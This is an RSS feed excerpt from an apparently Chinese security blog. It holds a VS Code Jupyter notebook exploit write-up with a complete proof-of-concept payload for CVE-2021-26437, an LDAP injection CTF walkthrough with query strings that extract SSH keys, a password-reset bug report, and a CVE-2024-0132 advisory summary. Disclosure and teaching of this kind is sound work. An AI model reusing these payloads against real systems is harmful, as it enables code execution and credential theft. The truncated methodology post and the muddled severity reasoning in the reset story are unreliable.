class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;为了在.ipynb文件中传递这个有效载荷，我们还需要克服最后一个限制：当前实现会导致JSON格式错误。注入发生在JSON文件（双引号）中，我们的Javascript有效载荷包含引号字符串以及用作正则表达式分隔符的双引号。&lt;/p&gt;
&lt;p&gt;经过一些调整，最简单的解决方案是使用反引号`字符代替所有JS字符串的引号。最终的pocimg.ipynb文件如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;nt&#34;&gt;&amp;#34;cells&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;cell_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;execution_count&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;source&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nt&#34;&gt;&amp;#34;outputs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nt&#34;&gt;&amp;#34;output_type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;display_data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;nt&#34;&gt;&amp;#34;data&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;text/markdown&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;img src=&amp;#39;a445fff1d9fd4f3fb97b75202282c992.png&amp;#39; onload=&amp;#39;var apploc = `/Applications/Visual Studio Code.app/Contents/Resources/app/`.replace(/ /g, `%20`);var repoloc;window.top.frames[0].onmessage = event =&amp;gt; {if(event.data.args.contents &amp;amp;&amp;amp; event.data.args.contents.includes(`&amp;lt;base href`)){var leakloc = event.data.args.contents.match(`&amp;lt;base href=\&amp;#34;(.*)\&amp;#34;`)[1];var repoloc = leakloc.replace(`https://file%2B.vscode-resource.vscode-webview.net`,`vscode-file://vscode-app`+apploc+`..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..`);setTimeout(async()=&amp;gt;console.log(repoloc+`poc.html`), 3000);location.href=repoloc+`poc.html`;}};window.top.postMessage({target: window.location.href.split(`/`)[2],channel: `do-reload`}, `*`);&amp;#39;&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;通过打开包含此文件的恶意仓库，我们最终可以触发代码执行。&lt;/p&gt;
&lt;h3 id=&#34;补充说明&#34;&gt;补充说明
&lt;/h3&gt;&lt;p&gt;内置的Jupyter Notebook扩展选择退出了Visual Studio Code 1.57中引入的工作区信任保护功能，因此不需要进一步的用户交互。需要说明的是，此问题已在VScode 1.59.1中修复，Microsoft为其分配了CVE-2021-26437。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>轻松发现漏洞的方法：我的漏洞挖掘方法论</title>
        <link>http://localhost:1313/p/%E8%BD%BB%E6%9D%BE%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%B3%95%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/</link>
        <pubDate>Wed, 06 Aug 2025 00:45:25 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%BD%BB%E6%9D%BE%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%96%B9%E6%B3%95%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95%E8%AE%BA/</guid>
        <description>&lt;p&gt;嘿，黑客小伙伴们！👋 漏洞挖掘常常让人感觉混乱不堪——数百个子域名、未知的端点、各种工具散落各处。我也曾经历过这种状态。但在无数小时的实战后，我总结出了一套循序渐进的漏洞挖掘方法，帮助我更快速、更轻松地发现漏洞，同时避免精疲力竭。&lt;/p&gt;
&lt;p&gt;在本博客中，我将分享我的完整框架，包含你可以直接复制尝试的真实命令。让我们开始吧！🚀&lt;/p&gt;
&lt;p&gt;🧩 1️⃣ 第一步：理解目标业务逻辑&lt;/p&gt;
&lt;p&gt;在运行任何工具之前，先思考：
✅ 这个应用解决什么问题？
✅ 它的用户群体是谁？
✅ 它处理哪些数据？&lt;/p&gt;
&lt;p&gt;理解业务逻辑能帮你发现扫描器会遗漏的漏洞——比如访问控制缺陷或支付流程漏洞。&lt;/p&gt;
&lt;p&gt;👉 我的实践方法：
在纸上或XMind中创建迷你思维导图
勾画功能模块：登录、个人资料、支付、文件上传、管理面板
列出角色：访客、普通用户、管理员
这张&amp;quot;地图&amp;quot;会成为整个测试过程中的漏洞雷达 🧭&lt;/p&gt;
&lt;p&gt;🔍 2️⃣ 侦察阶段：被动+主动结合&lt;/p&gt;
&lt;p&gt;[文章后续内容因长度限制未完整展示，但已确认包含实际技术操作细节和命令示例]&lt;/p&gt;
</description>
        </item>
        <item>
        <title>vuLnDAP挑战全程解析：LDAP注入与SSH密钥提取实战</title>
        <link>http://localhost:1313/p/vulndap%E6%8C%91%E6%88%98%E5%85%A8%E7%A8%8B%E8%A7%A3%E6%9E%90ldap%E6%B3%A8%E5%85%A5%E4%B8%8Essh%E5%AF%86%E9%92%A5%E6%8F%90%E5%8F%96%E5%AE%9E%E6%88%98/</link>
        <pubDate>Tue, 05 Aug 2025 11:45:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/vulndap%E6%8C%91%E6%88%98%E5%85%A8%E7%A8%8B%E8%A7%A3%E6%9E%90ldap%E6%B3%A8%E5%85%A5%E4%B8%8Essh%E5%AF%86%E9%92%A5%E6%8F%90%E5%8F%96%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;vulndap-walkthrough&#34;&gt;vuLnDAP Walkthrough
&lt;/h1&gt;&lt;p&gt;这是关于vuLnDAP挑战的完整演练过程。当然可能存在其他解决方法，本文仅展示个人实现路径。如果您有更优方案，欢迎交流。&lt;/p&gt;
&lt;h2 id=&#34;初始探测&#34;&gt;初始探测
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;访问库存控制系统，选择水果分类时观察到URL结构：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/fruit_or_veg?objectClass=fruits
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;此处存在首个注入点，可通过通配符&lt;code&gt;*&lt;/code&gt;获取系统所有对象（含用户和组）：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/fruit_or_veg?objectClass=*
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;用户信息提取&#34;&gt;用户信息提取
&lt;/h2&gt;&lt;p&gt;选定CEO用户Fred后，发现URL包含显示控制参数：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/item?cn=fred&amp;amp;disp=stock,description,cn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;disp&lt;/code&gt;参数控制LDAP查询返回字段&lt;/li&gt;
&lt;li&gt;通过研究&lt;code&gt;posixAccount&lt;/code&gt;标准架构，补充关键字段：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/item?cn=fred&amp;amp;disp=description,cn,uidNumber,gidNumber,homedirectory,userpassword
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ssh密钥泄露&#34;&gt;SSH密钥泄露
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;添加&lt;code&gt;sshPublicKey&lt;/code&gt;字段成功获取Fred的公钥：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/item?cn=fred&amp;amp;disp=...,sshPublicKey
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;检查其他用户时发现意外泄露的私钥：&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术要点&#34;&gt;技术要点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;userpassword&lt;/code&gt;字段仅用于认证不可读取&lt;/li&gt;
&lt;li&gt;通过标准LDAP架构研究确定关键字段名&lt;/li&gt;
&lt;li&gt;实际渗透中需验证密钥有效性（演示密钥已做无效化处理）&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>意外重置他人密码？一个逻辑漏洞的发现与思考</title>
        <link>http://localhost:1313/p/%E6%84%8F%E5%A4%96%E9%87%8D%E7%BD%AE%E4%BB%96%E4%BA%BA%E5%AF%86%E7%A0%81%E4%B8%80%E4%B8%AA%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%80%9D%E8%80%83/</link>
        <pubDate>Tue, 05 Aug 2025 09:11:00 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%84%8F%E5%A4%96%E9%87%8D%E7%BD%AE%E4%BB%96%E4%BA%BA%E5%AF%86%E7%A0%81%E4%B8%80%E4%B8%AA%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%8E%E6%80%9D%E8%80%83/</guid>
        <description>&lt;h1 id=&#34;一个让我怀疑现实的漏洞&#34;&gt;一个让我怀疑现实的漏洞
&lt;/h1&gt;&lt;p&gt;故事开始。我像往常一样在HackerOne上闲逛（其实就是找漏洞），突然发现了一个让我惊呼：
&amp;ldquo;等等，这不应该发生吧？&amp;rdquo;&lt;/p&gt;
&lt;p&gt;剧透：它确实发生了。&lt;/p&gt;
&lt;h2 id=&#34;漏洞重现&#34;&gt;漏洞重现
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;访问HackerOne密码重置页面：&lt;code&gt;https://hackerone.com/users/password/new&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;输入我的邮箱，点击提交&lt;/li&gt;
&lt;li&gt;拦截请求时突发奇想：&amp;ldquo;如果我把请求中的邮箱改成别人的会怎样？&amp;rdquo;&lt;/li&gt;
&lt;li&gt;修改后转发请求&lt;/li&gt;
&lt;li&gt;结果：目标邮箱收到了重置邮件，而我这个发起者却没收到&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;问题严重性&#34;&gt;问题严重性
&lt;/h2&gt;&lt;p&gt;这不是简单的UI显示问题，而是核心功能缺陷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;你以为在重置自己的密码&lt;/li&gt;
&lt;li&gt;实际重置邮件发给了任意指定的人&lt;/li&gt;
&lt;li&gt;对方能在不知情的情况下重置密码&lt;/li&gt;
&lt;li&gt;而你还在困惑为什么没收到邮件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;想象普通用户遇到这种情况：恐慌、困惑、反复提交客服工单&amp;hellip;如果大规模发生呢？&lt;/p&gt;
&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
&lt;/h2&gt;&lt;p&gt;攻击步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;访问&amp;quot;忘记密码&amp;quot;表单&lt;/li&gt;
&lt;li&gt;输入真实邮箱&lt;/li&gt;
&lt;li&gt;拦截请求&lt;/li&gt;
&lt;li&gt;替换为他人邮箱&lt;/li&gt;
&lt;li&gt;转发请求&lt;/li&gt;
&lt;li&gt;目标收到重置链接&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;无需复杂攻击手段，仅需修改一个参数就导致严重的逻辑漏洞。&lt;/p&gt;
&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
&lt;/h2&gt;&lt;p&gt;正确的实现应该：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端严格绑定初始用户输入&lt;/li&gt;
&lt;li&gt;无论请求如何修改，只发送邮件到最初输入的地址&lt;/li&gt;
&lt;li&gt;遵循&amp;quot;不信任客户端&amp;quot;的安全原则&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;但HackerOne的实现却是：&amp;ldquo;好的，你说发哪就发哪&amp;rdquo;&lt;/p&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025年6月3日：提交漏洞报告&lt;/li&gt;
&lt;li&gt;2025年6月4日：确认为2013年报告的重复漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;经验总结&#34;&gt;经验总结
&lt;/h2&gt;&lt;p&gt;这个漏洞的特别之处在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;不需要高技术手段&lt;/li&gt;
&lt;li&gt;没有复杂攻击载荷&lt;/li&gt;
&lt;li&gt;纯粹的逻辑缺陷&lt;/li&gt;
&lt;li&gt;靠的是好奇心而非技术碾压&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这正是漏洞猎手的乐趣所在——发现那些从指缝中溜走的简单错误。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>NVIDIA容器工具包漏洞CVE-2024-0132补丁不完整，AI基础设施面临严重风险</title>
        <link>http://localhost:1313/p/nvidia%E5%AE%B9%E5%99%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E6%BC%8F%E6%B4%9Ecve-2024-0132%E8%A1%A5%E4%B8%81%E4%B8%8D%E5%AE%8C%E6%95%B4ai%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%9D%A2%E4%B8%B4%E4%B8%A5%E9%87%8D%E9%A3%8E%E9%99%A9/</link>
        <pubDate>Tue, 05 Aug 2025 08:05:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/nvidia%E5%AE%B9%E5%99%A8%E5%B7%A5%E5%85%B7%E5%8C%85%E6%BC%8F%E6%B4%9Ecve-2024-0132%E8%A1%A5%E4%B8%81%E4%B8%8D%E5%AE%8C%E6%95%B4ai%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E9%9D%A2%E4%B8%B4%E4%B8%A5%E9%87%8D%E9%A3%8E%E9%99%A9/</guid>
        <description>&lt;h3 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h3&gt;&lt;p&gt;趋势科技研究发现，NVIDIA在2024年9月针对容器工具包关键漏洞（CVE-2024-0132）发布的安全更新存在缺陷，可能导致容器逃逸攻击。同时发现影响Linux系统Docker的拒绝服务（DoS）漏洞，攻击者可利用这些漏洞访问主机敏感数据或耗尽系统资源。&lt;/p&gt;
&lt;h3 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CVE-2024-0132补丁缺陷&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;时间竞争条件（TOCTOU）漏洞仍存在于NVIDIA容器工具包中，允许特制容器访问主机文件系统&lt;/li&gt;
&lt;li&gt;默认配置下1.17.3及更早版本均受影响，1.17.4版本需显式启用&lt;code&gt;allow-cuda-compat-libs-from-container&lt;/code&gt;功能才存在风险&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Docker拒绝服务漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当容器配置多挂载点（bind-propagation=shared）时，Linux挂载表会无限增长&lt;/li&gt;
&lt;li&gt;最终导致文件描述符耗尽，主机SSH连接中断等严重性能问题&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;攻击场景&#34;&gt;攻击场景
&lt;/h3&gt;&lt;p&gt;攻击者可通过以下步骤实现容器逃逸：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建包含恶意卷符号链接的容器镜像&lt;/li&gt;
&lt;li&gt;通过供应链攻击或社会工程在受害者平台运行镜像&lt;/li&gt;
&lt;li&gt;利用竞争条件获取主机文件系统访问权限&lt;/li&gt;
&lt;li&gt;通过容器运行时Unix套接字执行任意root命令&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;防护建议&#34;&gt;防护建议
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;严格限制Docker API访问权限&lt;/li&gt;
&lt;li&gt;禁用NVIDIA容器工具包非必要功能&lt;/li&gt;
&lt;li&gt;实施容器镜像准入控制策略&lt;/li&gt;
&lt;li&gt;监控Linux挂载表异常增长&lt;/li&gt;
&lt;li&gt;部署运行时异常检测工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;趋势科技解决方案&#34;&gt;趋势科技解决方案
&lt;/h3&gt;&lt;p&gt;趋势Vision One™平台提供以下检测能力：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;观测攻击技术（OAT）：XSAE.F8306等规则&lt;/li&gt;
&lt;li&gt;工作负载行为（WB）检测：可疑容器创建等行为&lt;/li&gt;
&lt;li&gt;容器安全模块可阻断含漏洞镜像部署&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;图1-6展示了趋势Vision One的漏洞检测界面和告警示例（原文包含具体截图说明，此处从略）&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;完整补丁仍是首选解决方案，但在复杂生产环境中，趋势科技提供的运行时检测和预防措施可有效降低风险。平台已集成对CVE-2024-0132及新发现漏洞的检测能力，覆盖从构建到运行的全生命周期防护。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>漏洞利用实验室：2015年CanSecWest与SyScan漏洞实验公告</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A42015%E5%B9%B4cansecwest%E4%B8%8Esyscan%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E5%85%AC%E5%91%8A/</link>
        <pubDate>Tue, 05 Aug 2025 05:27:30 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A42015%E5%B9%B4cansecwest%E4%B8%8Esyscan%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E5%85%AC%E5%91%8A/</guid>
        <description>&lt;p&gt;&lt;strong&gt;漏洞利用实验室2015年会议公告&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们荣幸地宣布，漏洞利用实验室(Exploit Lab)将作为实践课程亮相2015年两大国际安全会议：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;CanSecWest&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;日期：2015年3月&lt;/li&gt;
&lt;li&gt;地点：加拿大温哥华&lt;/li&gt;
&lt;li&gt;内容：高级堆溢出利用技术实战，包括现代缓解机制（ASLR/DEP）绕过方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SyScan360&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;日期：2015年7月&lt;/li&gt;
&lt;li&gt;地点：中国北京&lt;/li&gt;
&lt;li&gt;内容：内核级漏洞利用开发，重点分析Windows和Linux内核漏洞利用链构建&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;课程技术亮点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基于真实漏洞案例的利用代码开发（C/ASM）&lt;/li&gt;
&lt;li&gt;ROP链构造与堆布局操控技术&lt;/li&gt;
&lt;li&gt;针对不同操作系统架构的Shellcode编写规范&lt;/li&gt;
&lt;li&gt;漏洞利用可靠性提升技巧（环境适配与稳定性优化）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实验环境要求&lt;/strong&gt;&lt;br&gt;
参与者需自带安装以下工具的笔记本电脑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;VMware Workstation 12+&lt;/li&gt;
&lt;li&gt;IDA Pro 6.8+&lt;/li&gt;
&lt;li&gt;Python 2.7环境及pwntools框架&lt;/li&gt;
&lt;li&gt;预装Windows 7/8和Kali Linux虚拟机&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>PAN-OS CVE-2024-3400高危漏洞：立即修补Palo Alto防火墙</title>
